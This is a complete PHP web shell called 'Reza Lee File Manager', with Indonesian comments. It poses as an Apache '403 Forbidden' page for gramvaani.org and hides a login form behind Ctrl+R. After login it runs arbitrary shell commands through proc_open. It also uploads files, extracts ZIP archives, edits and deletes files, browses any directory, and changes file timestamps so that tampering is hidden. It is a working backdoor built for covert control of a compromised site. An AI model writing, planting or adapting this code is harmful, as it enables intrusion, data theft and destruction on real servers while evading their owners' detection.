<?php
session_start();

// ============== KONFIGURASI LOGIN ==============
$valid_user_hash = '$2y$10$N7Gp6LVIueLAwRuFUF/Nkus0a2tmGKxzBub1qY7A.f2sn53sc4ksO'; // class 
$valid_pass_hash = '$2y$10$x9baC.xkZL24pB/LzgKyCuc0pUNjahTFlNNURkFekpXBaiokQ76aS'; // admin

// ============== FUNGSI BANTU ==============
function isPathSafe($base, $target) {
    $realBase = realpath($base);
    $realTarget = realpath($target);
    return $realTarget && strpos($realTarget, $realBase) === 0;
}

function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

// ============== PROSES LOGIN ==============
if (isset($_POST['user'], $_POST['pass'])) {
    if (password_verify($_POST['user'], $valid_user_hash) && password_verify($_POST['pass'], $valid_pass_hash)) {
        $_SESSION['login'] = true;
    }
}

// ============== CEK LOGIN ==============
if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>403 Forbidden</title>
    <style>
        /* Hidden login form - only appears with Ctrl+R */
        .hidden-login {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 5px 30px rgba(0,0,0,0.3);
            z-index: 9999;
            width: 300px;
            border: 1px solid #ddd;
            font-family: Arial, sans-serif;
        }
        .hidden-login.active {
            display: block;
        }
        .hidden-login h2 {
            margin: 0 0 15px 0;
            color: #333;
            font-size: 18px;
            text-align: center;
        }
        .hidden-login input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .hidden-login button {
            width: 100%;
            padding: 8px;
            background: #c00;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .hidden-login button:hover {
            background: #a00;
        }
        .hidden-login .close-btn {
            position: absolute;
            top: 5px;
            right: 10px;
            background: none;
            border: none;
            font-size: 20px;
            color: #999;
            cursor: pointer;
            width: auto;
            padding: 0;
        }
        .hidden-login .close-btn:hover {
            color: #c00;
            background: none;
        }
        .error-message {
            background: #ffeeee;
            color: #c00;
            padding: 8px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 10px;
            text-align: center;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 9998;
        }
        .overlay.active {
            display: block;
        }
    </style>
</head>
<body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access this resource.</p>
    <hr>
    <address>Apache/2.4.58 (Ubuntu) Server at gramvaani.org Port 80</address>

    <!-- Overlay -->
    <div class="overlay" id="overlay"></div>
    
    <!-- Hidden Login Form (Ctrl+R to show) -->
    <div class="hidden-login" id="loginForm">
        <button class="close-btn" onclick="hideLogin()">&times;</button>
        <h2>🔐 Authentication Required</h2>
        
        <?php if (isset($_POST['user']) || isset($_POST['pass'])): ?>
            <div class="error-message">
                Invalid username or password!
            </div>
        <?php endif; ?>
        
        <form method="post">
            <input type="text" name="user" placeholder="Username" required autofocus>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        // Show login form with Ctrl+R (no visual hints)
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                showLogin();
            }
        });
        
        // Show login function
        function showLogin() {
            document.getElementById('loginForm').classList.add('active');
            document.getElementById('overlay').classList.add('active');
            document.querySelector('#loginForm input[name="user"]').focus();
        }
        
        // Hide login function
        function hideLogin() {
            document.getElementById('loginForm').classList.remove('active');
            document.getElementById('overlay').classList.remove('active');
        }
        
        // Click overlay to close
        document.getElementById('overlay').addEventListener('click', hideLogin);
        
        // Auto show if there was a login attempt
        <?php if (isset($_POST['user']) || isset($_POST['pass'])): ?>
        window.onload = function() {
            showLogin();
        };
        <?php endif; ?>
        
        // Escape key to close
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && document.getElementById('loginForm').classList.contains('active')) {
                hideLogin();
            }
        });
    </script>
</body>
</html>
<?php
    exit;
}

// ============== INISIALISASI PATH ==============
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) {
    $path = getcwd();
}
$home_shell_path = __DIR__;

// ============== PROSES FILE OPERATIONS ==============
// Delete
if (isset($_GET['delete'])) {
    $target = $path . '/' . $_GET['delete'];
    if (isPathSafe($path, $target) && is_writable($target)) {
        if (is_file($target)) unlink($target);
        elseif (is_dir($target)) rmdir($target);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = $path . '/' . $_POST['rename_from'];
    $to = $path . '/' . basename($_POST['rename_to']);
    if (isPathSafe($path, $from) && file_exists($from)) {
        rename($from, $to);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Edit tanggal
if (isset($_POST['edit_date_file'], $_POST['new_date'])) {
    $target = $path . '/' . $_POST['edit_date_file'];
    if (isPathSafe($path, $target) && file_exists($target)) {
        $timestamp = strtotime($_POST['new_date']);
        if ($timestamp !== false) {
            touch($target, $timestamp);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Buat folder
if (isset($_POST['new_folder'])) {
    $newFolder = $path . '/' . basename($_POST['new_folder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0755, true);
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Buat file
if (isset($_POST['new_file'])) {
    $newFile = $path . '/' . basename($_POST['new_file']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, '');
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Upload single
if (isset($_FILES['upload'])) {
    $target = $path . '/' . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Upload multiple
if (!empty($_FILES['uploads'])) {
    foreach ($_FILES['uploads']['name'] as $i => $name) {
        if ($_FILES['uploads']['error'][$i] === UPLOAD_ERR_OK) {
            $target = $path . '/' . basename($name);
            move_uploaded_file($_FILES['uploads']['tmp_name'][$i], $target);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Upload & extract ZIP
if (!empty($_FILES['zipfile']['name'])) {
    $tmpZip = $_FILES['zipfile']['tmp_name'];
    $destZip = $path . '/' . basename($_FILES['zipfile']['name']);
    
    if (move_uploaded_file($tmpZip, $destZip)) {
        $zip = new ZipArchive;
        if ($zip->open($destZip) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            unlink($destZip);
        }
    }
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Save file
if (isset($_POST['save_file'], $_POST['content'])) {
    $file = $path . '/' . $_POST['save_file'];
    if (isPathSafe($path, $file) && is_file($file)) {
        file_put_contents($file, $_POST['content']);
    }
    header("Location: ?path=" . urlencode($path) . (isset($_GET['edit']) ? '' : ''));
    exit;
}

// ============== BACA DIREKTORI ==============
$items = scandir($path);
$dirs = [];
$files = [];

foreach ($items as $f) {
    if ($f === '.' || $f === '..') continue;
    $full = $path . '/' . $f;
    if (is_dir($full)) {
        $dirs[] = $f;
    } else {
        $files[] = $f;
    }
}

$allItems = array_merge($dirs, $files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reza Lee - File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #48bb78;
            --danger: #f56565;
            --warning: #ecc94b;
            --dark: #1a202c;
            --light: #f7fafc;
            --border: #e2e8f0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('https://i.ibb.co/0yWKG2xW/b5fde3aeac3f67bb67dea13409805809.jpg') center/cover;
            opacity: 0.1;
            z-index: 0;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        
        /* Header */
        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .header-left h1 {
            color: var(--dark);
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .header-left h1 i {
            color: var(--primary);
            margin-right: 10px;
        }
        
        .header-left .subtitle {
            color: #666;
            font-size: 14px;
        }
        
        .header-left .subtitle i {
            color: var(--warning);
            margin-right: 5px;
        }
        
        .theme-toggle {
            background: var(--dark);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s ease;
        }
        
        .theme-toggle:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        /* Navigation */
        .nav-bar {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 15px 25px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .path-breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            color: #666;
        }
        
        .path-breadcrumb i {
            color: var(--primary);
        }
        
        .path-breadcrumb a {
            color: var(--primary);
            text-decoration: none;
            padding: 5px 10px;
            border-radius: 5px;
            transition: all 0.3s ease;
            background: rgba(102, 126, 234, 0.1);
        }
        
        .path-breadcrumb a:hover {
            background: var(--primary);
            color: white;
        }
        
        .nav-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 15px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            background: white;
            color: var(--dark);
            border: 1px solid var(--border);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }
        
        .btn-success {
            background: var(--success);
            color: white;
            border: none;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
            border: none;
        }
        
        .btn-warning {
            background: var(--warning);
            color: var(--dark);
            border: none;
        }
        
        .btn-outline {
            background: transparent;
            border: 2px solid var(--primary);
            color: var(--primary);
        }
        
        .btn-outline:hover {
            background: var(--primary);
            color: white;
        }
        
        /* Quick Actions */
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .action-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .action-card h3 {
            color: var(--dark);
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .action-card h3 i {
            color: var(--primary);
        }
        
        .action-form {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .action-form input[type="text"],
        .action-form input[type="file"] {
            flex: 1;
            min-width: 150px;
            padding: 8px 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 14px;
        }
        
        .action-form input[type="text"]:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        /* File Table */
        .file-table {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }
        
        .file-table table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-table th {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            font-weight: 600;
            font-size: 14px;
            padding: 15px;
            text-align: left;
        }
        
        .file-table td {
            padding: 12px 15px;
            border-bottom: 1px solid var(--border);
            color: var(--dark);
        }
        
        .file-table tr:last-child td {
            border-bottom: none;
        }
        
        .file-table tr:hover td {
            background: rgba(102, 126, 234, 0.05);
        }
        
        .file-icon {
            margin-right: 8px;
            color: var(--primary);
        }
        
        .file-name {
            display: flex;
            align-items: center;
        }
        
        .file-name a {
            color: var(--dark);
            text-decoration: none;
            font-weight: 500;
        }
        
        .file-name a:hover {
            color: var(--primary);
        }
        
        .dir-name {
            color: var(--primary) !important;
            font-weight: 600;
        }
        
        .file-size {
            font-family: monospace;
            font-size: 13px;
        }
        
        .file-perm {
            font-family: monospace;
            font-size: 13px;
            padding: 4px 8px;
            border-radius: 4px;
            background: #f0f0f0;
            display: inline-block;
        }
        
        .perm-755 { background: #c6f6d5; color: #22543d; }
        .perm-644 { background: #bee3f8; color: #2c5282; }
        .perm-555 { background: #fed7d7; color: #742a2a; }
        
        .date-form {
            display: flex;
            gap: 5px;
            align-items: center;
        }
        
        .date-form input[type="datetime-local"] {
            padding: 4px 8px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-size: 12px;
        }
        
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }
        
        .action-btn {
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            text-decoration: none;
            color: white;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .action-btn.edit { background: var(--primary); }
        .action-btn.rename { background: var(--warning); color: var(--dark); }
        .action-btn.delete { background: var(--danger); }
        .action-btn.date { background: var(--success); }
        
        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }
        
        /* Terminal */
        .terminal-section {
            background: rgba(26, 32, 44, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .terminal-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            color: #48bb78;
        }
        
        .terminal-header h3 {
            color: white;
            font-size: 18px;
        }
        
        .terminal-form {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .terminal-form input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            background: #2d3748;
            border: 1px solid #4a5568;
            border-radius: 8px;
            color: #48bb78;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .terminal-form input[type="text"]:focus {
            outline: none;
            border-color: #48bb78;
        }
        
        .terminal-output {
            background: #1a202c;
            border-radius: 8px;
            padding: 15px;
            color: #48bb78;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid #2d3748;
        }
        
        /* Editor */
        .editor-section {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
        }
        
        .editor-section h3 {
            color: var(--dark);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .editor-section textarea {
            width: 100%;
            height: 400px;
            padding: 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            resize: vertical;
            margin-bottom: 15px;
        }
        
        .editor-section textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .editor-actions {
            display: flex;
            gap: 10px;
        }
        
        /* Light Theme */
        body.light-theme .header,
        body.light-theme .nav-bar,
        body.light-theme .action-card,
        body.light-theme .file-table,
        body.light-theme .editor-section {
            background: rgba(255, 255, 255, 0.98);
        }
        
        body.light-theme .terminal-section {
            background: #f0f0f0;
        }
        
        body.light-theme .terminal-section h3 {
            color: var(--dark);
        }
        
        body.light-theme .terminal-form input[type="text"] {
            background: white;
            color: var(--dark);
            border-color: var(--border);
        }
        
        body.light-theme .terminal-output {
            background: #e0e0e0;
            color: var(--dark);
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                text-align: center;
            }
            
            .nav-bar {
                flex-direction: column;
            }
            
            .quick-actions {
                grid-template-columns: 1fr;
            }
            
            .action-form {
                flex-direction: column;
            }
            
            .file-table {
                overflow-x: auto;
            }
            
            .file-table table {
                min-width: 800px;
            }
        }
        
        /* Loading animation */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="header-left">
                <h1><i class="fas fa-terminal"></i> Reza Lee File Manager</h1>
                <p class="subtitle"><i class="fas fa-heart" style="color: #f56565;"></i> Selalu ikuti kata hatimu! Tapi ingat bawalah otakmu juga!</p>
            </div>
            <button class="theme-toggle" id="themeToggle">
                <i class="fas fa-moon"></i> Dark Mode
            </button>
        </div>
        
        <!-- Navigation -->
        <div class="nav-bar">
            <div class="path-breadcrumb">
                <i class="fas fa-folder"></i>
                <?php
                $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
                $build = '';
                echo '<a href="?path=' . urlencode($home_shell_path) . '"><i class="fas fa-home"></i> Home</a>';
                foreach ($parts as $part) {
                    if ($part === '') continue;
                    $build .= '/' . $part;
                    echo '<i class="fas fa-chevron-right" style="font-size: 12px;"></i>';
                    echo '<a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
                }
                ?>
            </div>
            <div class="nav-actions">
                <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn btn-outline">
                    <i class="fas fa-arrow-up"></i> Naik Level
                </a>
                <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="btn btn-primary">
                    <i class="fas fa-home"></i> Home
                </a>
            </div>
        </div>
        
        <!-- Quick Actions -->
        <div class="quick-actions">
            <!-- Upload File -->
            <div class="action-card">
                <h3><i class="fas fa-upload"></i> Upload File</h3>
                <form method="post" enctype="multipart/form-data" class="action-form">
                    <input type="file" name="upload" required>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                </form>
            </div>
            
            <!-- Upload Multiple -->
            <div class="action-card">
                <h3><i class="fas fa-files"></i> Upload Multiple</h3>
                <form method="post" enctype="multipart/form-data" class="action-form">
                    <input type="file" name="uploads[]" multiple required>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-upload"></i> Upload
                    </button>
                </form>
            </div>
            
            <!-- Upload ZIP -->
            <div class="action-card">
                <h3><i class="fas fa-file-archive"></i> Upload & Extract ZIP</h3>
                <form method="post" enctype="multipart/form-data" class="action-form">
                    <input type="file" name="zipfile" accept=".zip" required>
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-file-archive"></i> Extract
                    </button>
                </form>
            </div>
            
            <!-- Buat Folder -->
            <div class="action-card">
                <h3><i class="fas fa-folder-plus"></i> Buat Folder</h3>
                <form method="post" class="action-form">
                    <input type="text" name="new_folder" placeholder="Nama folder..." required>
                    <button type="submit" class="btn btn-success">
                        <i class="fas fa-plus"></i> Buat
                    </button>
                </form>
            </div>
            
            <!-- Buat File -->
            <div class="action-card">
                <h3><i class="fas fa-file"></i> Buat File</h3>
                <form method="post" class="action-form">
                    <input type="text" name="new_file" placeholder="Nama file..." required>
                    <button type="submit" class="btn btn-success">
                        <i class="fas fa-plus"></i> Buat
                    </button>
                </form>
            </div>
        </div>
        
        <!-- File Table -->
        <div class="file-table">
            <table>
                <thead>
                    <tr>
                        <th><i class="fas fa-file"></i> Nama</th>
                        <th><i class="fas fa-weight-hanging"></i> Ukuran</th>
                        <th><i class="fas fa-lock"></i> Permission</th>
                        <th><i class="fas fa-calendar"></i> Tanggal</th>
                        <th><i class="fas fa-cog"></i> Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($allItems as $f): 
                        $full = $path . '/' . $f;
                        $isDir = is_dir($full);
                        $perm = substr(sprintf('%o', fileperms($full)), -4);
                        $permClass = '';
                        if ($perm === '0755' || $perm === '0644') $permClass = 'perm-644';
                        elseif ($perm === '0555') $permClass = 'perm-555';
                        else $permClass = 'perm-755';
                        $mtime = filemtime($full);
                    ?>
                    <tr>
                        <td>
                            <div class="file-name">
                                <?php if ($isDir): ?>
                                    <i class="fas fa-folder file-icon" style="color: #ecc94b;"></i>
                                    <a href="?path=<?php echo urlencode($full); ?>" class="dir-name">
                                        <?php echo htmlspecialchars($f); ?>
                                    </a>
                                <?php else: ?>
                                    <i class="fas fa-file file-icon"></i>
                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>">
                                        <?php echo htmlspecialchars($f); ?>
                                    </a>
                                <?php endif; ?>
                            </div>
                        </td>
                        <td class="file-size">
                            <?php echo $isDir ? '-' : formatSize(filesize($full)); ?>
                        </td>
                        <td>
                            <span class="file-perm <?php echo $permClass; ?>">
                                <?php echo $perm; ?>
                            </span>
                        </td>
                        <td>
                            <form method="post" class="date-form">
                                <input type="hidden" name="edit_date_file" value="<?php echo htmlspecialchars($f); ?>">
                                <input type="datetime-local" name="new_date" value="<?php echo date('Y-m-d\TH:i', $mtime); ?>">
                                <button type="submit" class="action-btn date" title="Update tanggal">
                                    <i class="fas fa-clock"></i>
                                </button>
                            </form>
                        </td>
                        <td>
                            <div class="action-buttons">
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="rename_from" value="<?php echo htmlspecialchars($f); ?>">
                                    <input type="hidden" name="rename_to" value="<?php echo htmlspecialchars($f); ?>">
                                    <button type="button" class="action-btn rename" onclick="renameItem(this, '<?php echo htmlspecialchars($f); ?>')" title="Rename">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                </form>
                                
                                <?php if (!$isDir): ?>
                                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($f); ?>" class="action-btn edit" title="Edit">
                                        <i class="fas fa-pen"></i>
                                    </a>
                                <?php endif; ?>
                                
                                <a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" 
                                   class="action-btn delete" 
                                   onclick="return confirm('Yakin ingin menghapus <?php echo htmlspecialchars($f); ?>?')"
                                   title="Delete">
                                    <i class="fas fa-trash"></i>
                                </a>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        
        <!-- Terminal -->
        <div class="terminal-section">
            <div class="terminal-header">
                <i class="fas fa-terminal" style="color: #48bb78;"></i>
                <h3>Terminal / Command Line</h3>
                <span class="loading" style="display: none;"></span>
            </div>
            
            <form method="post" class="terminal-form" id="terminalForm">
                <input type="text" 
                       name="cmd" 
                       placeholder="Masukkan perintah... (contoh: ls -la, pwd, whoami)" 
                       value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>"
                       autocomplete="off">
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-play"></i> Run
                </button>
            </form>
            
            <?php
            // Terminal execution
            if (isset($_POST['cmd'])) {
                $cmd = trim($_POST['cmd']);
                if ($cmd === '') {
                    echo '<div class="terminal-output">[Error] Tidak ada perintah yang dimasukkan.</div>';
                } else {
                    // Cari shell yang tersedia
                    $shell = is_executable('/bin/bash') ? '/bin/bash' : (is_executable('/bin/sh') ? '/bin/sh' : '');
                    
                    if (!$shell) {
                        echo '<div class="terminal-output">[Error] Shell tidak ditemukan. Pastikan server mengizinkan proc_open.</div>';
                    } else {
                        // Bangun perintah dengan cd ke path
                        $fullCmd = 'cd ' . escapeshellarg($path) . ' 2>/dev/null && ' . $shell . ' -c ' . escapeshellarg($cmd) . ' 2>&1';
                        
                        $descriptors = [
                            0 => ['pipe', 'r'],
                            1 => ['pipe', 'w'],
                            2 => ['pipe', 'w']
                        ];
                        
                        $process = @proc_open($fullCmd, $descriptors, $pipes, null, null);
                        
                        if (!is_resource($process)) {
                            echo '<div class="terminal-output">[Error] Gagal membuka proses. Mungkin proc_open diblokir.</div>';
                        } else {
                            stream_set_blocking($pipes[1], false);
                            stream_set_blocking($pipes[2], false);
                            
                            $output = '';
                            $startTime = time();
                            $timeout = 30; // 30 detik timeout
                            
                            fclose($pipes[0]); // Tutup stdin
                            
                            while (true) {
                                $read = [$pipes[1], $pipes[2]];
                                $write = null;
                                $except = null;
                                
                                $num = stream_select($read, $write, $except, 1, 0);
                                
                                if ($num !== false && $num > 0) {
                                    foreach ($read as $r) {
                                        $chunk = stream_get_contents($r);
                                        if ($chunk !== false && $chunk !== '') {
                                            $output .= $chunk;
                                        }
                                    }
                                }
                                
                                $status = proc_get_status($process);
                                if (!$status['running']) {
                                    $output .= stream_get_contents($pipes[1]);
                                    $output .= stream_get_contents($pipes[2]);
                                    break;
                                }
                                
                                if ((time() - $startTime) > $timeout) {
                                    proc_terminate($process, 9);
                                    $output .= "\n\n[Error] Perintah timeout setelah {$timeout} detik.";
                                    break;
                                }
                                
                                usleep(100000); // 100ms
                            }
                            
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            proc_close($process);
                            
                            echo '<div class="terminal-output">';
                            echo htmlspecialchars($output !== '' ? $output : '[Tidak ada output]');
                            echo '</div>';
                        }
                    }
                }
            }
            ?>
        </div>
        
        <!-- File Editor -->
        <?php if (isset($_GET['edit'])): 
            $edit = realpath($path . '/' . $_GET['edit']);
            if (isPathSafe($path, $edit) && is_file($edit)):
                $content = htmlspecialchars(file_get_contents($edit));
        ?>
        <div class="editor-section">
            <h3><i class="fas fa-edit"></i> Mengedit: <?php echo htmlspecialchars(basename($edit)); ?></h3>
            <form method="post">
                <textarea name="content" spellcheck="false"><?php echo $content; ?></textarea>
                <div class="editor-actions">
                    <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit)); ?>">
                    <button type="submit" class="btn btn-success">
                        <i class="fas fa-save"></i> Simpan
                    </button>
                    <a href="?path=<?php echo urlencode($path); ?>" class="btn btn-outline">
                        <i class="fas fa-times"></i> Batal
                    </a>
                </div>
            </form>
        </div>
        <?php endif; endif; ?>
    </div>
    
    <script>
        // Theme Toggle
        const themeToggle = document.getElementById('themeToggle');
        const body = document.body;
        
        if (localStorage.getItem('theme') === 'light') {
            body.classList.add('light-theme');
            themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
        }
        
        themeToggle.addEventListener('click', () => {
            body.classList.toggle('light-theme');
            if (body.classList.contains('light-theme')) {
                localStorage.setItem('theme', 'light');
                themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
            } else {
                localStorage.setItem('theme', 'dark');
                themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
            }
        });
        
        // Rename function
        function renameItem(button, oldName) {
            const newName = prompt('Masukkan nama baru:', oldName);
            if (newName && newName !== oldName) {
                const form = button.closest('form');
                form.querySelector('input[name="rename_to"]').value = newName;
                form.submit();
            }
        }
        
        // Loading indicator for terminal
        const terminalForm = document.getElementById('terminalForm');
        if (terminalForm) {
            terminalForm.addEventListener('submit', function() {
                const loading = document.querySelector('.loading');
                if (loading) {
                    loading.style.display = 'inline-block';
                }
            });
        }
    </script>
</body>
</html>
<?php
// End of file
?>